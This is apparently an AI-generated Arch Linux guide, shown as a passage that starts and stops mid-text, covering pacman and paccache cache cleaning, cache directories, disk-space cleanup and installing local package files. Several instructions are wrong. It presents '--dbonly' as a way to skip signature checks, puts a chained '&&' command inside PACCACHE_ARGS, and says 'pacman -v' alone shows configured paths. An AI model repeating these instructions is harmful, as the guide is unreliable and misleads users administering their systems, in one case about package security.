Do you want to remove unused repositories? [Y/n]
```


**Limitation:** Unlike `paccache`, this command does not offer the option to keep multiple versions of installed packages—it removes all uninstalled package versions entirely.[2][4]

#### pacman -Scc (Aggressive Cleaning)

Remove all cached packages, including those currently installed:[5][2][4]

```
sudo pacman -Scc
```


**Actions performed:**
- Deletes **all** cached packages (installed or not)[4]
- Deletes all repository databases[4]
- Completely empties `/var/cache/pacman/pkg/`[5]

**WARNING:** This is extremely aggressive and should only be used when desperate for space. After running this:[4]
- Cannot downgrade packages without redownloading
- Cannot reinstall packages offline
- Must redownload packages if corruption occurs[4]

**Double confirmation required:**
```
Do you want to remove all files from cache? [y/N]
Do you want to remove unused sync repositories? [y/N]
```


### Automation Strategies

#### Automated Weekly Cleaning with Timer

Enable the systemd timer to automatically clean the cache weekly:[3][2]

```
sudo systemctl enable --now paccache.timer
```


This runs `paccache -r` weekly, keeping the three most recent versions by default.[2]

#### Configure Timer Arguments

Customize the timer behavior by editing the configuration file:[2]

```
sudo nano /etc/conf.d/pacman-contrib
```


**Examples:**
```
PACCACHE_ARGS='-k1'      # Keep only 1 version
PACCACHE_ARGS='-uk0'     # Remove all uninstalled packages
PACCACHE_ARGS='-rk2'     # Keep 2 versions
```


After modifying, reload the timer:
```
sudo systemctl restart paccache.timer
```

#### Pacman Hook for Automatic Cleaning

Create a hook to run paccache automatically after every pacman transaction:[6][7][2]

**Install from AUR:**
```
yay -S paccache-hook
```


**Manual hook creation:**
```
# /etc/pacman.d/hooks/paccache.hook
[Trigger]
Operation = Upgrade
Operation = Install
Operation = Remove
Type = Package
Target = *

[Action]
Description = Cleaning pacman cache...
When = PostTransaction
Exec = /usr/bin/paccache -rk3
```


This executes after every package operation, automatically keeping the cache under control.[6]

**More aggressive hook (remove uninstalled):**
```
Exec = /usr/bin/paccache -ruk0
```


#### Cron Job Automation

Schedule regular cache cleaning with cron:[6]

```
sudo crontab -e
```

**Weekly cleanup (every Sunday at 3 AM):**
```
0 3 * * 0 /usr/bin/paccache -rk3
```


**Monthly cleanup (first day of month):**
```
0 3 1 * * /usr/bin/paccache -rk2
```

### Cleaning AUR Helper Caches

#### AUR Helper Cache Locations

AUR helpers maintain separate caches that must be cleaned independently:[8][6]

**yay cache:**
```
~/.cache/yay/
```


**paru cache:**
```
~/.cache/paru/
```


#### Built-in AUR Helper Cleaning

**Using yay:**
```
yay -Sc     # Clean uninstalled AUR packages
yay -Scc    # Clean all AUR cache
```


**Clean after every operation:**
```
yay -S package --cleanafter
```


**Using paru:**
```
paru -Sc    # Clean uninstalled AUR packages
paru -Scc   # Clean all AUR cache
```

#### Manual AUR Cache Cleaning

Remove all AUR build files and cached packages:[6]

```
rm -rf ~/.cache/yay/*
rm -rf ~/.cache/paru/*
```


### Advanced Cache Management Scripts

#### Combined Cleanup Script

Create a comprehensive cleanup script:[6]

```bash
#!/bin/bash
# /usr/local/bin/paccache-clear

# Clean pacman cache (keep 3 versions)
echo "Cleaning pacman cache..."
paccache -rk3

# Clean uninstalled packages
echo "Removing uninstalled packages from cache..."
paccache -ruk0

# Clean yay cache
if command -v yay &> /dev/null; then
  echo "Cleaning yay cache..."
  yay -Sc --noconfirm
fi

# Clean paru cache
if command -v paru &> /dev/null; then
  echo "Cleaning paru cache..."
  paru -Sc --noconfirm
fi

echo "Cache cleaning complete!"
```


Make it executable:
```
sudo chmod +x /usr/local/bin/paccache-clear
```

Run with:
```
sudo paccache-clear
```

### Cache Size Monitoring

#### Check Cache Size

View the current cache size:[3][6]

```
du -sh /var/cache/pacman/pkg/
```


**Detailed breakdown:**
```
du -h /var/cache/pacman/pkg/ | tail -1
```

#### Count Cached Packages

Count how many package files are cached:

```
ls /var/cache/pacman/pkg/ | wc -l
```

#### List Largest Cached Packages

Identify which packages consume the most space:

```
du -h /var/cache/pacman/pkg/* | sort -h | tail -20
```

This shows the 20 largest cached package files.

### Best Practices

**Regular cleaning:** Clean the cache weekly or monthly to prevent excessive growth.[7][3]

**Conservative retention:** Keep at least 2-3 recent versions to enable easy downgrading if issues arise.[1][4]

**Automate the process:** Use systemd timers or pacman hooks to avoid manual intervention.[2][6]

**Clean uninstalled packages aggressively:** These provide no benefit since the packages aren't on your system.[1]

**Avoid -Scc unless necessary:** The aggressive cleaning removes all downgrade/recovery capabilities.[4]

**Monitor disk space:** Regularly check cache size to identify when cleaning is needed.[6]

**Include AUR caches:** Don't forget to clean AUR helper caches separately.[6]

Sources
[1] clear your pacman cache. I freed 40 GB by clearing mine https://www.reddit.com/r/archlinux/comments/q8e6lx/psa_clear_your_pacman_cache_i_freed_40_gb_by/
[2] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[3] How To Clean The Package Cache In Arch Linux https://ostechnix.com/recommended-way-clean-package-cache-arch-linux/
[4] How to Clean Package Cache (`pacman -Sc`) on Arch Linux https://www.siberoloji.com/how-to-clean-package-cache-pacman--sc-on-arch-linux/
[5] [SOLVED] Question about cleaning the package cache https://bbs.archlinux.org/viewtopic.php?id=285219
[6] Pacman is BLOATING Up My System! (Cleaning the cache ... https://www.youtube.com/watch?v=wp3LfWwCrZE
[7] Friendly reminder to do some system maintenance https://forum.endeavouros.com/t/friendly-reminder-to-do-some-system-maintenance/24636
[8] Clearing cache? · Issue #772 · Jguer/yay https://github.com/Jguer/yay/issues/772

## Partial Cache Cleaning

### paccache Options for Selective Cleaning

The `paccache` utility from `pacman-contrib` provides granular control over cache cleaning, allowing retention of specific package versions while removing others.[1][2]

### Controlling Version Retention

#### Keep Specific Number of Versions

**Keep 3 versions (default):**
```
sudo paccache -r
```


This removes all cached versions except the three most recent for each package.[1][2]

**Keep 1 version:**
```
sudo paccache -rk1
```


**Keep 2 versions:**
```
sudo paccache -rk2
```


**Keep 5 versions:**
```
sudo paccache -rk5
```

The `-k` or `--keep` flag specifies how many recent versions to retain.[1][3]

### Targeting Specific Package States

#### Clean Only Uninstalled Packages

**Remove all cached versions of uninstalled packages:**
```
sudo paccache -ruk0
```


This removes every cached version of packages no longer installed on the system. The `-u` or `--uninstalled` flag limits the action to uninstalled packages only.[1][3]

**Keep N versions of uninstalled packages:**
```
sudo paccache -ruk2
```

This keeps the two most recent versions of uninstalled packages, removing older versions.

#### Clean Only Installed Packages

The default behavior (without `-u`) operates only on installed packages.[1]

**Keep 1 version of installed packages only:**
```
sudo paccache -rk1
```


This leaves uninstalled package caches untouched.

### Combined Cleaning Strategies

#### Dual-Phase Approach (Recommended)

A popular strategy combines aggressive cleaning of uninstalled packages with conservative retention for installed packages:[3]

```
sudo paccache -ruk0 && sudo paccache -rk2
```


**Actions performed:**
1. Remove all cached versions of uninstalled packages (`-ruk0`)
2. Keep the two most recent versions of installed packages (`-rk2`)

This balances space savings with downgrade/recovery capabilities.[3]

**Alternative with 3 versions retained:**
```
sudo paccache -ruk0 && sudo paccache -rk3
```

This keeps more versions of installed packages for additional rollback flexibility.

### Custom Package Selection Strategies

#### Keep Both Current and Latest Versions

For advanced scenarios where you want to keep the currently installed version plus the latest cached version, custom scripting is required. Standard `paccache` doesn't support this directly.[4]

**Example scenario:**[4]
```
foo-1.0.1-1.pkg.tar.xz  # ← Installed version
foo-1.0.4-1.pkg.tar.xz  # ← Latest cached version
```

Remove all other intermediate versions.[4]

**Custom solution required:** Write a script that:
1. Identifies the installed version from `pacman -Q`
2. Identifies the newest version in cache
3. Removes all other versions[4]

### Dry Run and Verbose Options

#### Preview Changes Before Cleaning

**Dry run mode:**
```
paccache -dk3
```


The `-d` or `--dryrun` flag shows what would be removed without actually deleting files.[3]

**Combined dry run example:**
```
paccache -dk2 && paccache -duk0
```


This shows space savings from keeping 2 versions of installed packages and removing all uninstalled packages, without performing the actual deletion.[3]

#### Verbose Output

**Verbose mode:**
```
sudo paccache -vrk2
```


The `-v` or `--verbose` flag provides detailed output showing which files are being removed.[3]

**Combined verbose cleaning:**
```
sudo paccache -vrk2 && sudo paccache -vruk0
```


This displays comprehensive information about the cleaning process.[3]

### Cleaning Specific Architectures

#### Filter by Architecture

**Target specific architecture:**
```
paccache -r --arch x86_64
```

This cleans only packages for the specified architecture.

**Multiple architectures:**
```
paccache -r --arch x86_64 --arch i686
```

### Cache Directory Options

#### Specify Custom Cache Directory

**Clean alternative cache location:**
```
paccache -r --cachedir /path/to/cache
```

This cleans packages from a non-standard cache directory instead of the default `/var/cache/pacman/pkg/`.

**Multiple cache directories:**
```
paccache -r --cachedir /var/cache/pacman/pkg/ --cachedir /mnt/backup/pkg/
```

This processes multiple cache locations in a single operation.

### Moving Old Packages Instead of Deleting

#### Archive Old Packages

**Move packages to archive directory:**
```
paccache -m /path/to/archive -rk1
```

The `-m` or `--move` flag moves old packages to the specified directory instead of deleting them. This provides a safety net while still cleaning the active cache.

**Example workflow:**
```
sudo mkdir -p /var/cache/pacman/archive
sudo paccache -m /var/cache/pacman/archive -rk1
```

Old packages are preserved in the archive directory for potential future use.

### Automation with Custom Retention

#### Configure paccache.timer Arguments

Edit the configuration file to customize automated cleaning:[1]

```
sudo nano /etc/conf.d/pacman-contrib
```


**Keep only 1 version:**
```
PACCACHE_ARGS='-k1'
```


**Remove uninstalled packages:**
```
PACCACHE_ARGS='-uk0'
```


**Combined strategy:**
```
PACCACHE_ARGS='-rk2 && paccache -ruk0'
```

After modifying, restart the timer:
```
sudo systemctl restart paccache.timer
```

### Custom Pacman Hooks

#### Hook with Specific Retention

Create a hook with custom retention policy:

```
# /etc/pacman.d/hooks/paccache-custom.hook
[Trigger]
Operation = Upgrade
Operation = Install
Operation = Remove
Type = Package
Target = *

[Action]
Description = Cleaning pacman cache (keep 2 versions)...
When = PostTransaction
Exec = /usr/bin/paccache -rk2
```

**Dual-action hook:**
```
Exec = /bin/sh -c '/usr/bin/paccache -ruk0; /usr/bin/paccache -rk2'
```

This executes both commands after every pacman transaction.

### Cleaning Specific Packages

#### Target Individual Packages

While `paccache` doesn't directly support targeting specific packages, manual removal is possible:

```
rm /var/cache/pacman/pkg/package-name-*.pkg.tar.zst
```

**Keep only the latest:**
```
ls -t /var/cache/pacman/pkg/package-name-*.pkg.tar.zst | tail -n +2 | xargs rm
```

This lists packages sorted by time, skips the first (newest), and removes the rest.

### Best Practices for Partial Cleaning

**Balance retention with space:** Keep 2-3 versions of installed packages for easy rollback.[3]

**Aggressively clean uninstalled:** Packages you don't use provide no benefit.[3]

**Use dry run first:** Always preview with `-d` before executing to avoid accidental deletions.[3]

**Automate conservatively:** Automated cleaning should err on the side of keeping more versions.[1]

**Consider disk space:** On systems with limited storage, keep fewer versions (1-2).[3]

**Large systems with ample space:** Keep more versions (5+) for extensive rollback capability.

**Document custom strategies:** If using complex retention policies, document them for future reference.[4]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] How to Clean Package Cache (`pacman -Sc`) on Arch Linux https://www.siberoloji.com/how-to-clean-package-cache-pacman--sc-on-arch-linux/
[3] Don't forget to clean your pacman cache! - Woefe's Blog https://woefe.com/posts/pacman_cache.html
[4] [solved] Pacman cache: Keep currently installed and ... https://bbs.archlinux.org/viewtopic.php?id=232619
[5] Pacman should auto clean the cache : r/archlinux https://www.reddit.com/r/archlinux/comments/1degfsd/pacman_should_auto_clean_the_cache/
[6] Pacman is BLOATING Up My System! (Cleaning the cache ... https://www.youtube.com/watch?v=wp3LfWwCrZE
[7] Pacman Cheatsheet https://gist.github.com/HFTrader/4fb15d461d86634fd1cba5d251ca7925
[8] Discussion about handling orphaned packages - Page 2 https://forum.garudalinux.org/t/discussion-about-handling-orphaned-packages/30881?page=2
[9] Friendly reminder to do some system maintenance https://forum.endeavouros.com/t/friendly-reminder-to-do-some-system-maintenance/24636

## Cache Directory Management

### Default Cache Location

Pacman stores downloaded package files in the cache directory specified by the `CacheDir` option in `/etc/pacman.conf`. The default location is `/var/cache/pacman/pkg/`.[1][2][3]

### Configuring Cache Directory

#### Single Cache Directory

To override the default cache location, edit `/etc/pacman.conf`:[2][3]

```
# /etc/pacman.conf
[options]
CacheDir = /path/to/cache/dir
```


**Important notes:**
- This must be an absolute path[2][3]
- The root path is not automatically prepended[3][2]
- The directory must have write permissions for pacman[2]
- Trailing slash is recommended but not required[1]

**Example:**
```
CacheDir = /mnt/storage/pacman/cache/
```

#### Multiple Cache Directories

Multiple cache directories can be specified, and they are tried in the order they are listed:[4][3][2]

**Option 1: Space-separated on one line:**
```
CacheDir = /mnt/external/cache/ /var/cache/pacman/pkg/
```


**Option 2: Multiple lines (recommended):**
```
CacheDir = /mnt/external/cache/
CacheDir = /var/cache/pacman/pkg/
```


**Behavior:**
- When downloading, pacman searches each cache directory in order for existing packages[3][2]
- If a package is not found in any cache directory, it downloads to the first cache directory with write access[2][3]
- Previously downloaded packages in any cache location are reused without re-downloading[2]

### Cache Directory Fallback Strategy

#### Primary and Fallback Locations

A common strategy uses an external drive as primary cache with local fallback:[4]

```
CacheDir = /run/media/username/external-drive/pacman-cache/
CacheDir = /var/cache/pacman/pkg/
```


**Behavior:**
- When external drive is mounted, packages download there[4]
- When external drive is unmounted, packages download to local cache[4]
- Pacman automatically falls back to the second location if the first isn't writable[2]

**Issue:** If the first directory doesn't exist, pacman creates it, which may cause warnings when mounting paths are unavailable.[4]

**Solution:** Use fstab to mount the external location directly to the cache folder when plugged in, so pacman doesn't need to know about physical storage locations.[4]

### Relocating Cache Directory

#### Method 1: Configuration File Change

Update the cache location in `/etc/pacman.conf`:[1]

```
CacheDir = /new/cache/location/
```


**Then move existing cache:**
```
sudo mkdir -p /new/cache/location
sudo mv /var/cache/pacman/pkg/* /new/cache/location/
```


This is the recommended approach for permanent relocation.[1]

#### Method 2: Mounting a Partition

Mount a dedicated partition or filesystem at the default cache location:[1]

```
sudo mount /dev/sdXn /var/cache/pacman/pkg/
```


**Add to `/etc/fstab` for persistence:**
```
/dev/sdXn  /var/cache/pacman/pkg/  ext4  defaults  0  2
```


This keeps the default path while using separate storage.[1]

#### Method 3: Bind Mount

Bind-mount a directory from another location to the default cache path:[1]

```
sudo mount --bind /mnt/storage/cache /var/cache/pacman/pkg/
```


**Add to `/etc/fstab`:**
```
/mnt/storage/cache  /var/cache/pacman/pkg/  none  bind  0  0
```


**Warning:** Do not use symlinks to relocate the cache directory. Symlinks cause pacman to misbehave, especially when pacman attempts to update itself.[1]

### Custom Cache for Special Installations

#### Chroot and Isolated Environments

When managing packages for chroot or isolated environments, specify custom cache locations:[5]

```
# /path/to/environment/etc/pacman.conf
[options]
RootDir = /path/to/environment/
CacheDir = /path/to/environment/var/cache/pacman/
HookDir = /path/to/environment/etc/pacman.d/hooks
GPGDir = /path/to/environment/etc/pacman.d/gnupg
```


**Required directory structure:**
```
/path/to/environment/
├── etc/
│   └── pacman.d/
│       ├── gnupg/
│       └── hooks/
└── var/
    ├── cache/
    │   └── pacman/
    ├── lib/
    │   └── pacman/
    └── log/
```


### Checking Cache Directory Location

#### Display Current Configuration

View the active cache directory with verbose output:

```
pacman -v
```

This shows all configured paths including cache directories.

#### Extract from Configuration File

Parse the configuration file to find cache directories:

```
grep "^CacheDir" /etc/pacman.conf
```

Or get the default if not specified:

```
awk '/^CacheDir/{print $3}' /etc/pacman.conf || echo "/var/cache/pacman/pkg/"
```

### Cache Directory Permissions

#### Required Permissions

The cache directory must be writable by the user running pacman (typically root):

```
sudo chown -R root:root /var/cache/pacman/pkg/
sudo chmod 755 /var/cache/pacman/pkg/
```

**Verify permissions:**
```
ls -ld /var/cache/pacman/pkg/
```

Should show:
```
drwxr-xr-x root root /var/cache/pacman/pkg/
```

### Cache Directory Size Management

#### Check Cache Size

Monitor how much space the cache consumes:

```
du -sh /var/cache/pacman/pkg/
```

**For multiple cache directories:**
```
du -sh /mnt/external/cache/ /var/cache/pacman/pkg/
```

#### Count Cached Packages

Count files in the cache:

```
ls /var/cache/pacman/pkg/ | wc -l
```

### Cleaning Specific Cache Directories

#### Clean Specific Location with paccache

Target a non-default cache directory:

```
paccache -r --cachedir /path/to/cache
```

**Clean multiple cache directories:**
```
paccache -r --cachedir /mnt/external/cache/ --cachedir /var/cache/pacman/pkg/
```

This processes all specified directories in one operation.

### Best Practices

**Use absolute paths:** Always specify full absolute paths in configuration.[3][2]

**Maintain write permissions:** Ensure pacman can write to at least one configured cache directory.[2]

**Order matters:** List preferred cache locations first when using multiple directories.[3][2]

**Avoid symlinks:** Never use symbolic links to redirect the cache directory.[1]

**External storage considerations:** When using external drives, implement proper fallback strategies.[4]

**Consistent structure:** Maintain standard directory structure in custom cache locations.[5]

**Monitor space usage:** Regularly check cache size to prevent disk space exhaustion.

**Clean all cache locations:** Remember to clean all configured cache directories, not just the default.

**Backup strategy:** Include cache directories in backup plans if downgrade capability is important.

**Document custom locations:** Keep records of non-standard cache configurations for system maintenance.

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] pacman.conf(5) https://pacman.archlinux.page/pacman.conf.5.html
[3] pacman.conf - pacman package manager configuration file https://manpages.ubuntu.com/manpages/questing/man5/pacman.conf.5.html
[4] How to properly set a second CacheDir in pacman.conf? https://www.reddit.com/r/archlinux/comments/5avvqr/how_to_properly_set_a_second_cachedir_in/
[5] Using pacman to Manage Emscripten Packages https://ignore.pl/2022/06/using_pacman_to_manage_emscripten_packages.html
[6] Change the default location of the database directory https://bbs.archlinux.org/viewtopic.php?id=292182
[7] Clearing Cache with Pacman: Speed Up Arch Linux https://www.linuxactionshow.com/pacman-clear-cache/
[8] Pacman Command To Manage Packages On Arch Linux ... https://www.2daygeek.com/pacman-command-examples-manage-packages-arch-linux-system/

## Disk Space Optimization

### Analyzing Disk Usage

#### Check Overall Disk Usage

View disk space usage of all mounted filesystems:[1]

```
df -h
```


This displays human-readable output showing used and available space for each partition.[1]

#### Identify Large Directories

Find which directories consume the most space:[1]

```
sudo du -h --max-depth=1 / | sort -hr
```


This shows top-level directories sorted by size. To dig deeper, change the path or increase `--max-depth`.[1]

#### Graphical Disk Analysis Tools

For visual disk space analysis, install GUI tools:[1]

```
sudo pacman -S baobab       # GNOME Disk Usage Analyzer
sudo pacman -S filelight    # KDE Disk Usage
sudo pacman -S ncdu         # Terminal-based
```


**Using ncdu:**
```
ncdu /
```

This provides an interactive terminal interface for exploring disk usage.

### Package Cache Optimization

#### View Cache Size

Check how much space the package cache consumes:[2][1]

```
du -sh /var/cache/pacman/pkg/
```


Over time, this directory can grow to 5-40+ GB.[2][1]

#### Basic Cache Cleaning

**Remove uninstalled packages:**
```
sudo pacman -Sc
```


This removes all cached packages not currently installed.[2][1]

**Remove all cached packages:**
```
sudo pacman -Scc
```


**Warning:** This deletes all cached packages, including recent ones, removing downgrade and offline reinstall capabilities.[1]

#### Intelligent Cache Management with paccache

Install and use `paccache` for controlled cleaning:[1]

```
sudo pacman -S pacman-contrib
sudo paccache -r
```


By default, this keeps the three most recent versions of each package.[1]

**Keep only the latest version:**
```
sudo paccache -rk1
```


**Remove all uninstalled packages:**
```
sudo paccache -ruk0
```


#### Automate Cache Cleanup

Enable weekly automatic cache cleaning:[1]

```
sudo systemctl enable --now paccache.timer
```


### Orphaned Package Removal

#### List Orphaned Packages

Orphaned packages are dependencies no longer required by any installed package:[1]

```
pacman -Qdt
```


#### Remove Orphaned Packages

Remove orphans along with their dependencies and configuration files:[1]

```
sudo pacman -Rns $(pacman -Qdtq)
```


This can free significant space by removing accumulated unneeded dependencies.[1]

### System Log Optimization

#### Journal Log Cleanup

Systemd journal logs can consume substantial space over time:[1]

**View journal disk usage:**
```
journalctl --disk-usage
```


**Clear logs older than 2 weeks:**
```
sudo journalctl --vacuum-time=2weeks
```


**Limit journal to 100MB:**
```
sudo journalctl --vacuum-size=100M
```


**Permanently limit journal size:**
Edit `/etc/systemd/journald.conf`:
```
SystemMaxUse=100M
```


Then restart the journald service:
```
sudo systemctl restart systemd-journald
```


### Temporary Files Cleanup

#### Clear System Temporary Files

Remove temporary files from `/tmp`:[5][1]

```
sudo rm -rf /tmp/*
```


Note: On most systems, `/tmp` is automatically cleaned on reboot or periodically by systemd.[1]

#### Clear User Cache

Remove user-level cache files:[1]

```
rm -rf ~/.cache/*
```


**Warning:** This may reset application preferences and require re-downloading data.[1]

### AUR Cache Cleanup

#### AUR Helper Cache Locations

AUR helpers maintain their own caches in user directories:[1]

- yay: `~/.cache/yay/`
- paru: `~/.cache/paru/`

#### Clean AUR Caches

**Using yay:**
```
yay -Sc
```


**Using paru:**
```
paru -Sc
```


**Manual cleanup:**
```
rm -rf ~/.cache/yay/*
rm -rf ~/.cache/paru/*
```


### Finding Large Files

#### Locate Files Over Specific Size

Find files larger than 100MB:[1]

```
find / -type f -size +100M 2>/dev/null
```


**Find largest 20 files:**
```
find / -type f -exec du -h {} + 2>/dev/null | sort -rh | head -n 20
```

#### Using ncdu for Interactive Search

```
sudo ncdu /
```


Navigate directories interactively and identify large files for deletion.[1]

### Partition Management

#### Root Partition Considerations

A common issue is insufficient root partition space. Pacman stores downloads and databases in `/var` (part of the root partition).[3][4]

**Symptoms:**
```
error: not enough free disk space
```


**Recommended root partition sizes:**
- Minimal: 20-30 GB[4]
- Comfortable: 35-50 GB[4]
- Large installations: 50-70 GB[4]

#### Expanding Root Partition

If root partition is too small:[4]

1. Backup important data
2. Boot into live environment
3. Resize partitions using tools like `gparted`
4. Shrink home partition if necessary
5. Expand root partition into freed space[4]

#### Single vs Separate Partitions

**Traditional approach:** Separate root and home partitions[4][2]

**Alternative:** Single large partition for both root and home[4]

Benefits of single partition:
- Flexible space usage
- No artificial limits
- Simpler management

Considerations:
- Less isolation between system and user data
- More difficult separate backups[4]

### Package Size Analysis

#### Find Largest Installed Packages

Identify which packages consume the most disk space:[5]

```
expac -H M '%m\t%n' | sort -h
```


Or using pacman:
```
pacman -Qi | awk '/^Name/{name=$3} /^Installed Size/{print $4$5, name}' | sort -h
```

This helps identify candidates for removal when space is critical.[5]

### Optional Space-Saving Measures

#### Remove Unused Locales

Install `localepurge` from AUR to delete unused language packs:[1]

```
yay -S localepurge
```


**Warning:** This may break some applications expecting all locales.[1]

#### Remove Unused Man Pages

For extreme minimalism (not recommended):[1]

```
sudo rm -rf /usr/share/man/*
```


This removes offline documentation, making troubleshooting more difficult.[1]

### Comprehensive Cleanup Summary

A complete system cleanup routine:[1]

```bash
# 1. Clean package cache
sudo paccache -r
sudo paccache -ruk0

# 2. Remove orphaned packages
sudo pacman -Rns $(pacman -Qdtq)

# 3. Clean journal logs
sudo journalctl --vacuum-time=2weeks

# 4. Clean temp files
sudo rm -rf /tmp/*
rm -rf ~/.cache/*

# 5. Clean AUR cache
yay -Sc
# or
paru -Sc

# 6. Check remaining disk usage
df -h
```


### Automation and Maintenance

#### Create Cleanup Script

Automate the cleanup process with a comprehensive script:[6]

```bash
#!/bin/bash
# /usr/local/bin/disk-cleanup

echo "Starting disk cleanup..."

# Clean pacman cache
echo "Cleaning pacman cache..."
paccache -rk2
paccache -ruk0

# Remove orphans
echo "Removing orphaned packages..."
ORPHANS=$(pacman -Qdtq)
if [ -n "$ORPHANS" ]; then
  sudo pacman -Rns $ORPHANS --noconfirm
else
  echo "No orphans found"
fi

# Clean journal
echo "Cleaning journal logs..."
journalctl --vacuum-time=2weeks

# Clean AUR caches
if command -v yay &> /dev/null; then
  echo "Cleaning yay cache..."
  yay -Sc --noconfirm
fi

if command -v paru &> /dev/null; then
  echo "Cleaning paru cache..."
  paru -Sc --noconfirm
fi

# Show results
echo "Disk cleanup complete!"
df -h /
```


#### Schedule Regular Maintenance

Use cron or systemd timers to run cleanup regularly:[6]

```
# Weekly cleanup (add to crontab)
0 3 * * 0 /usr/local/bin/disk-cleanup
```


### Best Practices

**Regular maintenance:** Clean caches and orphans weekly or monthly.[1]

**Monitor disk usage:** Check `df -h` regularly to catch space issues early.[4][1]

**Adequate root partition:** Allocate at least 30-50 GB for root to avoid space constraints.[4]

**Conservative cache retention:** Keep 2-3 package versions for rollback capability.[1]

**Automate when possible:** Use systemd timers and hooks to maintain the system automatically.[1]

**Document customizations:** Keep records of space optimization strategies for consistency.

Sources
[1] How to Free Up Disk Space on Arch Linux | Siberoloji https://www.siberoloji.com/how-to-free-up-disk-space-on-arch-linux/
[2] Pacman, don't eat my disk space - Random Determinism https://randomdeterminism.wordpress.com/2009/04/12/pacman-dont-eat-my-disk-space/
[3] [Resolved] Pacman insufficient storage despite active space check ... https://bbs.archlinux.org/viewtopic.php?id=290740
[4] pacman complains about not enough free disk space : r/archlinux https://www.reddit.com/r/archlinux/comments/j3d9gm/pacman_complains_about_not_enough_free_disk_space/
[5] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[6] Pacman is BLOATING Up My System! (Cleaning the cache in Arch ... https://www.youtube.com/watch?v=wp3LfWwCrZE
[7] Improving performance - ArchWiki https://wiki.archlinux.org/title/Improving_performance
[8] How to allocate space for root and home partitions in Arch Linux? https://www.facebook.com/groups/linux.fans.group/posts/24748692378079211/


# Package Files

## Installing from Local Files

### Basic Local Package Installation

#### Using the -U Flag

To install a package from a local file (not from a remote repository), use the `-U` or `--upgrade` flag:[1][2][3][4]

```
sudo pacman -U /path/to/package/package_name-version.pkg.tar.zst
```


**Examples:**
```
sudo pacman -U ~/Downloads/firefox-120.0-1-x86_64.pkg.tar.zst
sudo pacman -U /var/cache/pacman/pkg/linux-6.5.9-1-x86_64.pkg.tar.zst
```


**Key features:**
- Installs the specified package file[2]
- Automatically resolves and installs dependencies from configured sync repositories[2]
- Can be used with packages built from AUR or downloaded manually[1]

### Keeping Package in Cache

#### Using file:// Protocol

To install a local package and keep a copy in pacman's cache, use the `file://` prefix with an absolute path:[3][5]

```
sudo pacman -U file:///path/to/package/package_name-version.pkg.tar.zst
```


**Example:**
```
sudo pacman -U file:///home/user/packages/firefox-120.0-1-x86_64.pkg.tar.zst
```


This syntax ensures the package is copied to `/var/cache/pacman/pkg/` during installation, providing a cached copy for future use.[5]

### Installing Remote Packages

#### Install from URL

Pacman can download and install packages directly from remote URLs:[3][5]

```
sudo pacman -U https://example.com/repo/package-1.0-1-x86_64.pkg.tar.zst
```


**Examples:**
```
sudo pacman -U https://archive.archlinux.org/packages/f/firefox/firefox-119.0-1-x86_64.pkg.tar.zst
```


Pacman downloads the package, verifies it, and installs with automatic dependency resolution from configured repositories.[5]

### Dependency Resolution

#### Automatic Dependency Installation

When installing local packages with `-U`, pacman automatically resolves and installs required dependencies from sync repositories:[2]

```
sudo pacman -U /path/to/package.pkg.tar.zst
```


**Process:**
1. Pacman examines the local package's dependencies
2. Searches configured sync repositories for required dependencies
3. Downloads and installs dependencies automatically
4. Installs the local package[2]

**Important:** Dependencies are fetched from sync repositories, not from the local directory containing the package. For dependency resolution from local files, a proper local repository must be configured.[2]

### Installing Multiple Local Packages

#### Specify Multiple Files

Install several local packages simultaneously:

```
sudo pacman -U /path/to/package1.pkg.tar.zst /path/to/package2.pkg.tar.zst /path/to/package3.pkg.tar.zst
```

**Using wildcards:**
```
sudo pacman -U /path/to/packages/*.pkg.tar.zst
```

This installs all package files in the specified directory.

### Installing from Cache

#### Reinstall from Cached Package

Packages in `/var/cache/pacman/pkg/` can be reinstalled directly:

```
sudo pacman -U /var/cache/pacman/pkg/package-name-version.pkg.tar.zst
```

This is useful for:
- Downgrading to older versions
- Reinstalling after accidental removal
- System recovery when repositories are unavailable

### Local Repository Setup

#### When Local Directory Has Many Packages

For directories containing many packages where you want proper dependency resolution among local files, create a local repository:[2]

**Step 1: Create repository database**
```
repo-add /path/to/repo/custom.db.tar.gz /path/to/repo/*.pkg.tar.zst
```


This creates a repository database file that indexes all packages in the directory.[2]

**Step 2: Add repository to pacman.conf**
```
# /etc/pacman.conf
[custom]
SigLevel = Optional TrustAll
Server = file:///path/to/repo
```


**Step 3: Synchronize and install**
```
sudo pacman -Sy
sudo pacman -S package_name
```


Now pacman can install packages from the local repository with full dependency resolution, treating local packages like repository packages.[2]

### Installation Options

#### Install as Dependency

Mark a local package as a dependency rather than explicitly installed:

```
sudo pacman -U --asdeps /path/to/package.pkg.tar.zst
```


This affects orphan detection—the package will be considered a dependency.[4]

#### Install as Explicit

Mark a local package as explicitly installed (default behavior):

```
sudo pacman -U --asexplicit /path/to/package.pkg.tar.zst
```


#### Skip Dependency Checks

**Warning:** This is dangerous and can break your system.[2]

```
sudo pacman -U --nodeps /path/to/package.pkg.tar.zst
```

Only use this in recovery scenarios when you understand the consequences.[2]

### Handling Conflicts

#### Overwrite Conflicting Files

If installation fails due to file conflicts:

```
sudo pacman -U --overwrite '*' /path/to/package.pkg.tar.zst
```

This forces installation by overwriting conflicting files.

**Target specific paths:**
```
sudo pacman -U --overwrite /usr/lib/libfoo.so /path/to/package.pkg.tar.zst
```

### Verification and Security

#### Package Signature Verification

Pacman automatically verifies package signatures during installation based on the `SigLevel` setting in `/etc/pacman.conf`.[6]

For local packages without signatures or with unknown signatures, you may need to adjust the signature level or skip verification (not recommended for security).

**Skip signature checks (risky):**
```
sudo pacman -U --dbonly /path/to/package.pkg.tar.zst
```

### Database-Only Installation

#### Register Package Without Extracting Files

Install a package to the database only, without extracting files:

```
sudo pacman -U --dbonly /path/to/package.pkg.tar.zst
```


**Use cases:**
- Manually compiled software needs registration in the database[7]
- System recovery when files are already in place
- Testing and development scenarios

**Warning:** This creates a database entry without actually installing files, which can lead to inconsistencies.[7]

### Batch Installation Scripts

#### Install All Packages from Directory

```bash
#!/bin/bash
# Install all packages from a directory

PACKAGE_DIR="/path/to/packages"

for pkg in "$PACKAGE_DIR"/*.pkg.tar.zst; do
  echo "Installing $pkg..."
  sudo pacman -U --noconfirm "$pkg"
done
```

**With error handling:**
```bash
#!/bin/bash
PACKAGE_DIR="/path/to/packages"

